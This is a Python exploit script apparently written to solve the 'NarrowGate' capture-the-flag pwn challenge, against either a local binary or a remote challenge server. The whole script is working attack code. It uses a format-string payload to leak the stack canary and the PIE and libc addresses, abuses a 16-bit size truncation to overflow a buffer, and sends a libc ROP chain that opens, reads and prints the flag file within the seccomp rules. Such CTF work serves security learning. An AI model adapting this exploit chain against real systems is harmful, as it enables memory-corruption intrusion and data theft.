#!/usr/bin/env python3
"""NFX NarrowGate: format-string leaks + 16-bit truncation + seccomp-safe ORW ROP.

Usage:
  python3 solve_narrowgate.py --local --path flag
  python3 solve_narrowgate.py --remote --path /flag
  python3 solve_narrowgate.py --remote --path flag.txt

The supplied ELF, bundled libc, and loader must be in ./narrowgate_analysis/peserta/
"""
import argparse
import os
import re
import select
import socket
import struct
import subprocess
import sys
import time

p64 = lambda x: struct.pack('<Q', x & 0xffffffffffffffff)
p32 = lambda x: struct.pack('<I', x & 0xffffffff)

LIBC_RET = 0x29d90
GADGETS = {
    'rdi': 0x2a3e5,
    'rsi': 0x2be51,
    'rdx_rbx': 0x90469,
    'rax': 0x45eb0,
    'syscall': 0x114289,
    'xchg_edi_eax': 0x164f5e,
}
RW_PATH = 0x224000  # writable libc .bss
RW_OUT = RW_PATH + 0x100

class Channel:
    def __init__(self, args):
        self.proc = None
        if args.local:
            base = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'narrowgate_analysis', 'peserta')
            self.proc = subprocess.Popen(
                [base+'/ld-linux-x86-64.so.2', '--library-path', base, base+'/narrowgate'],
                cwd=base,
                stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                bufsize=0)
            self.read_fd = self.proc.stdout.fileno()
            self.write = self.proc.stdin.write
        else:
            self.sock = socket.create_connection((args.host,args.port),timeout=10)
            self.sock.setblocking(False)
            self.read_fd = self.sock.fileno()
            self.write = self.sock.sendall

    def recv(self, seconds=1, max_bytes=65536):
        ready,_,_=select.select([self.read_fd],[],[],seconds)
        if not ready: return b''
        if self.proc:
            return os.read(self.read_fd,max_bytes)
        try:return self.sock.recv(max_bytes)
        except BlockingIOError:return b''

    def recvuntil(self, term, timeout=6):
        ret=b'';start=time.monotonic()
        while term not in ret and time.monotonic()-start<timeout:
            x=self.recv(min(0.2,max(0,timeout-(time.monotonic()-start))))
            if x: ret+=x
        if term not in ret: raise RuntimeError('Timeout while waiting for '+repr(term)+'; got '+repr(ret[-250:]))
        return ret

def create_payload(canary, libc, path):
    g=lambda k: p64(libc+GADGETS[k])
    pathptr = libc + RW_PATH
    outptr = libc + RW_OUT
    # Only syscalls explicitly allowed by challenge seccomp: read=0, write=1, open=2.
    q=[]
    def put(*vals): q.extend(vals)
    def set_rdi(v):put(g('rdi'),p64(v))
    def set_rsi(v):put(g('rsi'),p64(v))
    def set_rdx(v):put(g('rdx_rbx'),p64(v),p64(0))
    def set_rax(v):put(g('rax'),p64(v))
    def sys_call(num):set_rax(num);put(g('syscall'))
    # Stage 2: input path followed by terminating NUL.
    set_rdi(0);set_rsi(pathptr);set_rdx(0x80);sys_call(0)
    # fd = open(path, O_RDONLY, 0)
    set_rdi(pathptr);set_rsi(0);sys_call(2)
    # fd from rax to edi, even when fd != 3.
    put(g('xchg_edi_eax'))
    # bytes_read = read(fd, out, 0x100)
    set_rsi(outptr);set_rdx(0x100);sys_call(0)
    # write(1, out, 0x100)
    set_rdi(1);set_rsi(outptr);set_rdx(0x100);sys_call(1)
    # exit(0)
    set_rdi(0);sys_call(60)
    chain=b''.join(q)
    print('[*] ROP chain bytes:',len(chain),'total payload:',len(chain)+88)
    return b'A'*72+p64(canary)+b'B'*8+chain

def main():
    ap=argparse.ArgumentParser()
    m=ap.add_mutually_exclusive_group(required=True)
    m.add_argument('--local',action='store_true')
    m.add_argument('--remote',action='store_true')
    ap.add_argument('--host',default='s1.nfx.my.id')
    ap.add_argument('--port',type=int,default=41619)
    ap.add_argument('--path',default='flag')
    ap.add_argument('--stage-delay',type=float,default=0.4)
    args=ap.parse_args()

    io=Channel(args)
    print('[*] Banner:',repr(io.recvuntil(b'name> ')))
    io.write(b'%27$p|%29$p|%43$p\n')
    leakout=io.recvuntil(b'blocks(4 bytes)> ')
    print('[*] Leak:',repr(leakout))
    m=re.search(rb'hello, (0x[0-9a-f]+)\|(0x[0-9a-f]+)\|(0x[0-9a-f]+)',leakout)
    if not m: raise RuntimeError('Unexpected leaks')
    canary,return_pie,return_libc=(int(x,16) for x in m.groups())
    libc=return_libc-LIBC_RET
    pie=return_pie-0x154b
    print('[+] Canary:',hex(canary),'PIE:',hex(pie),'libc:',hex(libc))
    if canary & 0xff or libc & 0xfff or pie & 0xfff:
        raise RuntimeError('Unexpected alignment; verify leak indices/libc!')
    payload=create_payload(canary,libc,args.path)
    # size=1025 -> n*64=65600 bytes read, but low 16 bits of (65600-1) == 63.
    io.write(p32(1025))
    time.sleep(0.1)
    io.write(payload)
    # Delay to ensure vulnerable read() returned before supplying path for ROP read().
    time.sleep(args.stage_delay)
    io.write(args.path.encode()+b'\0')
    data=b'';end=time.monotonic()+4.0
    while time.monotonic()<end:
        part=io.recv(0.25)
        if part:
            data+=part
            if b'NFX{' in data: break
        elif data:
            break
    print('[*] Output bytes:',repr(data[:800]))
    flags=re.findall(rb'NFX\{[^\x00\r\n}]{1,200}\}',data)
    if flags: print('[+] FLAG:',flags[0].decode('ascii','replace'))
    else: print('[-] No flag returned; path may differ or remote may be unreachable')
    if io.proc:
        try: print('[*] Process exit code:',io.proc.wait(timeout=2))
        except subprocess.TimeoutExpired: io.proc.kill();print('[!] Process hung')

if __name__=='__main__':
    main()